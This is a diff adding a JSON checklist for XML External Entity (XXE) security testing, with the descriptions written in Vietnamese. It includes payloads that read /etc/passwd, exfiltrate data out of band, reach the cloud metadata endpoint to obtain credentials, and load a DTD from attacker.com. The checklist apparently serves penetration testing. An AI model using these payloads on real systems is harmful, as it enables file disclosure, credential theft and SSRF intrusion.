@@ -1,0 +1,43 @@
+{
+  "id": "xxe",
+  "name": "XML External Entities (XXE) Testing",
+  "group": "vulnerability",
+  "items": [
+    {
+      "id": "xxe-01",
+      "title": "Basic XXE file read",
+      "severity": "CRITICAL",
+      "description": "Thêm DOCTYPE entity vào XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> rồi dùng &xxe; trong body. Kiểm tra file content có hiện trong response không."
+    },
+    {
+      "id": "xxe-02",
+      "title": "Blind XXE via out-of-band",
+      "severity": "HIGH",
+      "description": "XXE không trả kết quả trong response. Dùng external DTD để exfiltrate: <!ENTITY xxe SYSTEM \"http://collaborator/?data=\" > hoặc dns lookup để xác nhận XXE tồn tại."
+    },
+    {
+      "id": "xxe-03",
+      "title": "XXE via file upload (SVG, DOCX, XLSX)",
+      "severity": "HIGH",
+      "description": "Nhúng XXE payload vào file upload: SVG (là XML), DOCX/XLSX (unzip, sửa XML bên trong). Nếu server xử lý file → trigger XXE."
+    },
+    {
+      "id": "xxe-04",
+      "title": "XXE in SOAP / XML API",
+      "severity": "CRITICAL",
+      "description": "Thêm XXE entity vào SOAP envelope hoặc XML request body. Thử đổi Content-Type của endpoint JSON:\n- application/xml\n- text/xml\nKiểm tra server có fall-back parse XML không."
+    },
+    {
+      "id": "xxe-05",
+      "title": "XXE to SSRF",
+      "severity": "CRITICAL",
+      "description": "Dùng XXE để trigger SSRF: <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">. XXE + SSRF kết hợp có thể lấy cloud credentials."
+    },
+    {
+      "id": "xxe-06",
+      "title": "Parameter entity XXE",
+      "severity": "HIGH",
+      "description": "Khi general entity bị block, thử parameter entity: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>. Hữu ích với blind XXE."
+    }
+  ]
+}
